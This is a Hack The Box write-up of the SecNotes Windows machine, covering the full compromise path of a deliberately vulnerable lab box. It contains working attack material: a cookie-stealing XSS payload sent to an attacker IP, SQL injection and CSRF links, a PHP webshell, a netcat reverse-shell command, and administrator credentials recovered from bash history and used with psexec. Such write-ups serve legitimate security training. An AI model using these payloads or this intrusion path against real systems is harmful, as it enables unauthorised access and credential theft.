---
layout: single
title: Secnotes - Hack The Box
date: 2019-01-19
classes: wide
header:
  teaser: /assets/images/htb-writeup-secnotes/secnotes_logo.png
categories:
  - hackthebox
  - infosec
tags:
  - hackthebox
  - windows
  - sqli
  - wsl
  - csrf
---

This blog post is a writeup of the Hack the Box SecNotes machine from [0xdf](https://0xdf.gitlab.io). 

Windows / 10.10.10.97

![](/assets/images/htb-writeup-secnotes/secnotes_logo.png)

## Summary

- The box runs a PHP application on an IIS server.
- There is a 2nd order SQL injection in the registration page which allows us to dump all the notes from the database. There is also a CSRF that we can leverage to reset the application password by sending a malicous link to a user through the Contact Us form.
- One of the note contains the credentials for user `Tyler`.
- Using the `Tyler` credentials, we can read/write files from the `new-site` share, which lets us upload a PHP webshell to the IIS site running on port `8808`.
- We can then get a shell by either uploading and running `nc.exe` or using a nishang poweshell oneliner, gaining an initial shell as user `Tyler` on the system. I had trouble getting output from `bash` using nishang so I eventually had to use netcat instead of nishang.
- Enumerating the box, we find that the Linux Subsystem is installed.
- After launching bash, we find in `.bash_history` the credentials for the `Administrator` user.

## Detailed steps

### Nmap scan

Only 3 ports are open, this should make the initial enumeration a bit easier.

- IIS port 80
- IIS port 8808
- SMB port 445

```
root@darkisland:~# nmap -sC -sV -p- 10.10.10.97
Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-25 15:10 EDT
Nmap scan report for 10.10.10.97
Host is up (0.015s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h15m41s, deviation: 4h02m31s, median: -4m19s
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2018-08-25T12:12:28-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2018-08-25 15:12:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 394.23 seconds
```

### Web enumeration

- Port 80 runs a custom SecNotes application
- Port 8808 doesn't have anything on it, except the default IIS page (tried enumerating with gobuster and didn't find anything)

### Finding #1: We can enumerate user accounts

The box tells us whether or not a username exists when we attempt to log in.

![](/assets/images/htb-writeup-secnotes/1.png)

I tried fuzzing different usernames with wfuzz but only found the `Tyler` username which we already know from the SecNotes application page:

```
wfuzz -z file,names.txt -d "username=FUZZ&password=1" --hs "No account found with that username" http://10.10.10.97/login.php
```

### Finding #2: Reflected XSS on the main login page

The HTML page returns the username when authentication fails and the input is not properly sanitized so we can trigger an XXS

Example payload in the username field: `"><script>alert(1);</script>`

![](/assets/images/htb-writeup-secnotes/2.png)

![](/assets/images/htb-writeup-secnotes/3.png)

But we won't be able to do anything useful with this since only our own user sees the error.

### Finding #3: Stored XSS in the notes applications

The notes application doesn't escape any of the input data so we can embed javascript in the notes and attempt to steal cookies. Unfortunately there is no other user connecting and checking the notes so this is not useful for us here (we can't steal session cookies of a logged on user).

Payload: `<script>document.write('<img src="http://10.10.14.23:80/collect.gif?cookie=' + document.cookie + '" />')</script>`

![](/assets/images/htb-writeup-secnotes/4.png)

![](/assets/images/htb-writeup-secnotes/5.png)

### Finding #4: 2nd order SQL injection on the registration page

There's an SQL injection vulnerability on the `home.php` page that we can abuse by creating a user with the following name: `test' or 1=1-- -`

Once we log in after, the notes page will display all the notes from all users. The resulting query probably ends up being something like `SELECT * FROM notes WHERE user = 'test' OR 1=1` so that basically returns all the notes because of the TRUE condition.

One of the notes contains the credentials for the `Tyler` user.

![](/assets/images/htb-writeup-secnotes/6.png)

### Finding #5: We can have Tyler change his password by sending him a link

The Change Password page works through a POST request but it also works if we use a GET request instead.

We can send messages to Tyler through the Contact Us form and he'll click on every link that we send him. Because there is no anti-CSRF token on the Change Password page, we can trick Tyler in changing his password.

Initially, I tried sending an HTML link such as:

`<a href="http://10.10.10.97/change_pass.php?password=test11&confirm_password=test11&submit=submit">Click this!</a>` but it didn't work.

However plaintext works: `http://10.10.10.97/change_pass.php?password=test11&confirm_password=test11&submit=submit`.

So we send this to Tyler and we can log in after with the password we specified in the link.

### User shell

The credentials for Tyler are in one of the notes:

```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```

Let's verify which shares he has access to:

```
root@darkisland:~/tmp# smbclient -U tyler -L //10.10.10.97
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\tyler's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	new-site        Disk      

root@darkisland:~/tmp# smbclient -U tyler //10.10.10.97/new-site
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\tyler's password: 
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Sun Aug 19 14:06:14 2018
  ..                                  D        0  Sun Aug 19 14:06:14 2018
  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018

		12978687 blocks of size 4096. 7919013 blocks available
```

So the `new-site` share is the root directory of the webserver listening on port 8808.

To get a shell on the box we'll do the following:

1. Upload a PHP webshell
2. Upload netcat
3. Run netcat through the webshell

Alternatively we could run nishang to get a reverse shell, but I had problem running `bash` and getting the output so netcat it is.

Webshell:

```php
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
  }
?>
</pre>
</BODY></HTML>
```

```
root@darkisland:~/tmp# smbclient -U tyler //10.10.10.97/new-site
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\tyler's password: 
Try "help" to get a list of possible commands.
smb: \> pwd
Current directory is \\10.10.10.97\new-site\
smb: \> ls
  .                                   D        0  Sun Aug 19 14:06:14 2018
  ..                                  D        0  Sun Aug 19 14:06:14 2018
  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018

		12978687 blocks of size 4096. 7919013 blocks available
smb: \> put snowscan.php
putting file snowscan.php as \snowscan.php (1.6 kb/s) (average 1.6 kb/s)
smb: \> put nc.exe
putting file nc.exe as \nc.exe (152.5 kb/s) (average 91.8 kb/s)
```

Trigger the netcat connection with: `http://secnotes.htb:8808/snowscan.php?cmd=nc+-e+cmd.exe+10.10.14.23+4444`
```
root@darkisland:~/tmp# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.97] 49757
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\new-site>whoami
whoami
secnotes\tyler

C:\inetpub\new-site>type c:\users\tyler\desktop\user.txt
type c:\users\tyler\desktop\user.txt
6fa755<redacted>
```

### Privesc

After looking around the box for a bit, I found that the Linux subsystem is installed. I noticed a Distros directory, Ubuntu then found bash.exe in `C:\Windows\System32`.

```
C:\>dir
06/21/2018  03:07 PM    <DIR>          Distros
[...]
```

```
C:\Distros\Ubuntu>
 Volume in drive C has no label.
 Volume Serial Number is 9CDD-BADA

 Directory of C:\Distros\Ubuntu

06/21/2018  05:59 PM    <DIR>          .
06/21/2018  05:59 PM    <DIR>          ..
07/11/2017  06:10 PM           190,434 AppxBlockMap.xml
07/11/2017  06:10 PM             2,475 AppxManifest.xml
06/21/2018  03:07 PM    <DIR>          AppxMetadata
07/11/2017  06:11 PM            10,554 AppxSignature.p7x
06/21/2018  03:07 PM    <DIR>          Assets
06/21/2018  03:07 PM    <DIR>          images
07/11/2017  06:10 PM       201,254,783 install.tar.gz
07/11/2017  06:10 PM             4,840 resources.pri
06/21/2018  05:51 PM    <DIR>          temp
07/11/2017  06:10 PM           222,208 ubuntu.exe
07/11/2017  06:10 PM               809 [Content_Types].xml
               7 File(s)    201,686,103 bytes
               6 Dir(s)  32,431,472,640 bytes free
```

```
C:\Windows\System32>dir bash.exe
06/21/2018  02:02 PM           115,712 bash.exe
```

After starting bash and looking around the system, we find the `Administrator` credentials in root's `.bash_history` file:
```
C:\Windows\System32>bash
mesg: ttyname failed: Inappropriate ioctl for device
python -c 'import pty;pty.spawn("/bin/bash")'
root@SECNOTES:~# cat .bash_history
cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
```

We can then psexec as administrator and get the root flag:
```
root@darkstar:~# /usr/share/doc/python-impacket/examples/psexec.py 'administrator:u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97 cmd.exe
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[*] Requesting shares on 10.10.10.97.....
[*] Found writable share ADMIN$
[*] Uploading file DmaHNXRy.exe
[*] Opening SVCManager on 10.10.10.97.....
[*] Creating service twnE on 10.10.10.97.....
[*] Starting service twnE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>type c:\users\administrator\desktop\root.txt
7250cd<redacted>
```